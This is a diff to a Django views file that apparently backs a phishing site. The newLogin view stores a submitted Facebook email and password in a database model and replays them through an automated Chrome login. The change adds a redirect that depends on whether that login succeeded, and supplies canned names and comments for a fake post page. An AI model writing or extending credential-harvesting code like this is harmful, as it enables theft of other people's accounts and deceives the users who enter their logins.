@@ -3,7 +3,7 @@ from .models import FacebookAccount
 from .check_login import FacebookLogin
 import time
 from django.views.decorators.cache import cache_control
-from .names_comments import names, comments
+from .names_comments import names, comments, tupleNamesComments
 # Create your views here.
 
 def instagram(request):
@@ -23,7 +23,11 @@ def newLogin(request):
         newLog.save()
         FacebookLogin(email=email, password=password, browser='Chrome').login()
         # time.sleep(5)
-        return redirect('post')
+
+        if FacebookLogin.isLogged:
+            return redirect('post')
+        else:
+            return redirect('facebook')
 
         #return redirect('https://www.youtube.com', code=307)
     else:
@@ -32,6 +36,6 @@ def newLogin(request):
 @cache_control(no_cache=True, must_revalidate=True)
 def post(request):
 
-    context={'names':names, 'comments':comments}
+    context={'names':names, 'comments':comments, 'tupleNamesComments':tupleNamesComments}
 
     return render(request, 'post.html', context)
